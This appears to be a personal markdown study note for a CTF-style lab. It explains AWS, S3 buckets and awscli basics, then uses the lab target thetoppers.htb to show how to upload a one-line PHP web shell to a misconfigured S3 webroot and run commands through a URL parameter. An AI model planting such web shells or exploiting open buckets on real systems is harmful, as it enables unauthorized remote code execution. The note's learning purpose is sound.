# Amazon

## Content
- []()
- []()
- []()
- []()
- []()

----
## [AWS](https://aws.amazon.com/)
> Amazon Web Services offers a broad set of global cloud-based products including compute, storage, databases, analytics, networking, mobile, developer tools, management tools, IoT, security, and enterprise applications: on-demand, available in seconds, with pay-as-you-go pricing
- It's basically Amazon's SaaS cloud computing platform ([doc](https://aws.amazon.com/what-is-aws/?nc1=f_cc)).
- One of those cloud services AWS offers is their **_storage_** option: Amazon S3.

## [Amazon S3](https://aws.amazon.com/s3/)
> Amazon Simple Storage Service (Amazon S3)
- Amazon Simple Storage Service (Amazon S3) is an object storage service.
  - Customers can use Amazon S3 to store and protect any amount of data for a range of use cases.
  - Amazon S3 provides management features so that you can optimize, organize, and configure access to your data to meet your specific requirements.
- Amazon S3 stores data as _objects_ within _buckets_.
  - An [objects](https://docs.aws.amazon.com/AmazonS3/latest/userguide/UsingObjects.html) is a file and any metadata that describes the file.
    - Objects are the fundamental entities stored in Amazon S3.
    - Each object can be up to 5 TB in size.
  - A _[bucket](https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html)_ is a container for objects. 

## [awscli](https://aws.amazon.com/cli/)
> The AWS Command Line Interface (AWS CLI) is a unified tool to manage your AWS services. With just one tool to download and configure, you can control multiple AWS services from the command line and automate them through scripts.
- You can interact with AWS, including an S3 bucket, with `awscli` (AWS Command Line Interface)

### Install
```
apt install awscli
```

### Configure
```
aws configure
```
- When prompted, just use an arbitrary value for the responses to the required values (e.g., "temp"). 

### List S3 Objects
- Use the `ls` command to list the objects and common prefixes under (in) the specified bucket:
```
aws --endpoint=http://s3.[domain name] s3 ls s3://[domain name]
# Results, example (for s3.thetoppers.htb): 
#                          PRE  images/
#  2024-02-24 15:02:08      0  .htaccess
#  2024-02-24 15:02:08  11952  index.php
```
- This particular example is that of the webroot of a website. An Apache server is using this S3 bucket as storage for the website's files. 

### Copy Files to an S3 Bucket
- In the example above, we could try uploading a PHP shell file to the S3 bucket and since it's uploaded to the webroot directory we can visit this webpage in the browser, which will, in turn, execute this file and we will achieve remote code execution.
- Continuing with that example...
```
# create a PHP file to upload
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# upload that file with awscli
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```
- Test that uploaded file by accessing it through the website: `http://thetoppers.htb/shell.php?cmd=id`
- If the response from the server contains the output of the OS command `id`, then we have code execution on the box. Now you'd just need to work out a reverese shell, etc. 








